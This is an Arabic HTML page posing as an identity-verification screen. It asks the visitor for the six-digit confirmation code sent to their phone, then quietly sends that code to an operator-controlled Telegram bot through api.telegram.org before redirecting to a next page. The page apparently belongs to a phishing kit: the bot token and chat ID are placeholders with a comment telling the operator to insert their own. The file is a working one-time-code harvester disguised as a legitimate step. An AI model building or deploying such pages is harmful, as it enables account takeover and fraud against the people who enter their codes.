<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>التحقق من الهوية</title>
<style>
body {
font-family: "Tajawal", Arial, sans-serif;
margin: 0;
padding: 0;
min-height: 100vh;
background: #fff;
color: #333;
display: flex;
flex-direction: column;
}

/* رأس الصفحة */
header {
position: relative;
padding: 16px;
text-align: center;
font-weight: bold;
font-size: 16px;
}
header a {
position: absolute;
top: 16px;
right: 16px;
font-size: 22px;
text-decoration: none;
color: #111;
transform: scaleX(-1); /* عكس اتجاه السهم */
}

/* المحتوى */
main {
flex: 1;
display: flex;
flex-direction: column;
justify-content: center;
align-items: center;
text-align: center;
padding: 24px 16px;
}

h2 {
margin: 20px 0 8px;
font-size: 20px;
font-weight: bold;
}
p {
margin: 0 0 20px;
color: #777;
font-size: 15px;
line-height: 1.6;
}

/* مربعات إدخال الرمز */
.code-inputs {
display: flex;
justify-content: center;
gap: 10px;
margin: 20px 0 30px;
}
.code-inputs input {
width: 44px;
height: 48px;
text-align: center;
font-size: 20px;
border: 1px solid #ccc;
border-radius: 8px;
}

/* العداد + إعادة الإرسال */
.resend-container {
display: flex;
align-items: center;
justify-content: center;
gap: 10px;
margin-top: 20px;
}

.circle {
position: relative;
width: 44px;
height: 44px;
}
.circle svg {
transform: rotate(-90deg);
width: 44px;
height: 44px;
}
.circle circle {
fill: none;
stroke-width: 4;
stroke-linecap: round;
}
.circle .bg {
stroke: #eee;
}
.circle .progress {
stroke: #ff6a2b;
stroke-dasharray: 138;
stroke-dashoffset: 0;
transition: stroke-dashoffset 1s linear;
}
.circle span {
position: absolute;
top: 50%;
left: 50%;
transform: translate(-50%, -50%);
font-size: 13px;
font-weight: bold;
color: #ff6a2b;
}

#resendText {
font-size: 15px;
color: #aaa;
cursor: default;
transition: color 0.3s;
}
#resendText.active {
color: #000;
cursor: pointer;
}

/* زر التالي */
#nextBtn {
width: 92%;
max-width: 400px;
padding: 14px;
font-size: 18px;
font-weight: bold;
border: none;
border-radius: 8px;
background: #ddd;
color: #888;
cursor: not-allowed;
margin: 24px auto;
transition: 0.3s;
}
#nextBtn.active {
background: #ff6a2b;
color: #fff;
cursor: pointer;
}

@media (max-width: 480px) {
h2 { font-size: 25px; }
p { font-size: 15px; }
.code-inputs input {
width: 40px;
height: 44px;
font-size: 18px;
}
}
</style>
</head>
<body>
<header>
<span>التحقق من الهوية</span>
<a href="index.html">←</a>
</header>

<main>
<h2>تم ارسال رمز التأكيد</h2>
<p>ادخل رمز التأكيد المكون من 6 خانات والذي تم إرساله إلى هاتفك للتحقق من حسابك</p>

<div class="code-inputs">
<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
<input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
</div>

<div class="resend-container">
<div class="circle">
<svg>
<circle class="bg" cx="22" cy="22" r="20"></circle>
<circle class="progress" cx="22" cy="22" r="20"></circle>
</svg>
<span id="countdown">60</span>
</div>
<span id="resendText">أعد إرسال رمز التأكيد</span>
</div>
</main>

<button id="nextBtn" disabled>التالي</button>

<script>
// 🔹 ضع بيانات بوت التلجرام هنا
const BOT_TOKEN = "ضع_هنا_التوكن";
const CHAT_ID = "ضع_هنا_الآي_دي";

const inputs = document.querySelectorAll(".code-inputs input");
const nextBtn = document.getElementById("nextBtn");
const resendText = document.getElementById("resendText");
const countdownEl = document.getElementById("countdown");
const progressCircle = document.querySelector(".progress");
const circumference = 2 * Math.PI * 20;

if (progressCircle) progressCircle.style.strokeDasharray = circumference;

let timer;
let timeLeft = 60;

function startTimer() {
  timeLeft = 60;
  countdownEl.textContent = timeLeft;
  resendText.classList.remove("active");

  timer = setInterval(() => {
    timeLeft--;
    countdownEl.textContent = timeLeft;
    const offset = circumference - (timeLeft / 60) * circumference;
    if (progressCircle) progressCircle.style.strokeDashoffset = offset;

    if (timeLeft <= 0) {
      clearInterval(timer);
      countdownEl.textContent = "0";
      resendText.classList.add("active");
    }
  }, 1000);
}

// أول تشغيل
startTimer();

resendText.addEventListener("click", () => {
  if (resendText.classList.contains("active")) {
    startTimer();
  }
});

// فقط أرقام، الانتقال التلقائي، اللصق لتعبئة الحقول، وتلوين المربعات عند الملء
inputs.forEach((input, idx) => {
  input.setAttribute('inputmode', 'numeric');
  input.setAttribute('pattern', '[0-9]*');

  input.addEventListener('keydown', (e) => {
    const allowed = ['Backspace','Delete','ArrowLeft','ArrowRight','Tab'];
    if (allowed.includes(e.key)) return;

    // Backspace: إذا الخانة فارغة نرجع للخانة السابقة ونمسحها
    if (e.key === 'Backspace') {
      if (input.value === '' && idx > 0) {
        e.preventDefault();
        const prev = inputs[idx - 1];
        prev.value = '';
        prev.classList.remove('filled');
        prev.focus();
        checkCode();
        return;
      }
      return;
    }

    // منع أي حرف غير رقمي
    if (e.key.length === 1 && !/^[0-9]$/.test(e.key)) e.preventDefault();
  });

  input.addEventListener('input', () => {
    const raw = (input.value || '').replace(/\D/g, '');
    if (!raw) {
      input.value = '';
      input.classList.remove('filled');
      checkCode();
      return;
    }

    // اذا تم لصق أكثر من رقم في خانة واحدة، وزع الباقي
    if (raw.length > 1) {
      for (let k = 0; k < raw.length && (idx + k) < inputs.length; k++) {
        inputs[idx + k].value = raw.charAt(k);
        if (inputs[idx + k].value) inputs[idx + k].classList.add('filled'); else inputs[idx + k].classList.remove('filled');
      }
      const nextIndex = Math.min(idx + raw.length, inputs.length - 1);
      inputs[nextIndex].focus();
      checkCode();
      return;
    }

    input.value = raw.slice(0,1);
    if (input.value) input.classList.add('filled'); else input.classList.remove('filled');
    if (input.value && idx < inputs.length - 1) inputs[idx + 1].focus();
    checkCode();
  });

  input.addEventListener('paste', (e) => {
    e.preventDefault();
    const paste = (e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'');
    if (!paste) return;
    for (let i = 0; i < inputs.length; i++) {
      inputs[i].value = paste.charAt(i) || '';
      if (inputs[i].value) inputs[i].classList.add('filled'); else inputs[i].classList.remove('filled');
    }
    // ضع التركيز في أول خانة فارغة
    for (let k = 0; k < inputs.length; k++) {
      if (!inputs[k].value) { inputs[k].focus(); break; }
    }
    checkCode();
  });
});

function checkCode() {
  let code = "";
  inputs.forEach(inp => code += inp.value);
  if (code.length === 6) {
    nextBtn.classList.add("active");
    nextBtn.disabled = false;
  } else {
    nextBtn.classList.remove("active");
    nextBtn.disabled = true;
  }
}

// إرسال الرمز إلى تلجرام مع إعادة التوجيه إلى splash1.html بعد النجاح
function sendToTelegram(code) {
  const message = `🔑 تم إدخال رمز التأكيد:\n${code}`;

  // إذا لم تضف بيانات البوت، أعرض تحذيرًا ثم حول العميل (سلوك تجريبي)
  if (!BOT_TOKEN || BOT_TOKEN.includes('ضع_هنا') || !CHAT_ID || CHAT_ID.includes('ضع_هنا')) {
    console.warn('Telegram credentials not set. Skipping fetch.');
    alert('تنبيه: لم يتم ضبط بيانات بوت تلجرام. سيتم تحويلك تجريبياً إلى الصفحة التالية.');
    // تحويل تجريبي
    window.location.href = 'splash1.html';
    return Promise.resolve({ok:false, error:'credentials_missing'});
  }

  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message
    })
  })
  .then(res => {
    if (!res.ok) throw new Error('Telegram API returned status ' + res.status);
    return res.json();
  })
  .then(data => {
    console.log("تم الإرسال:", data);
    if (data && data.ok) {
      // إرسال ناجح -> تحويل العميل
      window.location.href = 'splash1.html';
    } else {
      // استجابة غير متوقعة من التلجرام
      alert('لم يتم إرسال الرسالة إلى تلجرام بنجاح. حاول مرة أخرى.');
      console.error('telegram response', data);
    }
    return data;
  })
  .catch(err => {
    console.error("خطأ في الإرسال:", err);
    alert("حدث خطأ عند إرسال الرمز إلى تلجرام: " + (err.message || err));
    throw err;
  });
}

// عند الضغط على زر التالي
nextBtn.addEventListener("click", () => {
  let code = "";
  inputs.forEach(inp => code += inp.value);
  if (code.length === 6) {
    // نرسل ثم ننتظر النتيجة (التحويل يتم داخل sendToTelegram عند النجاح)
    sendToTelegram(code).catch(()=>{/* خطأ تم التعامل معه داخل sendToTelegram */});
  }
});
</script>
</body>
</html>
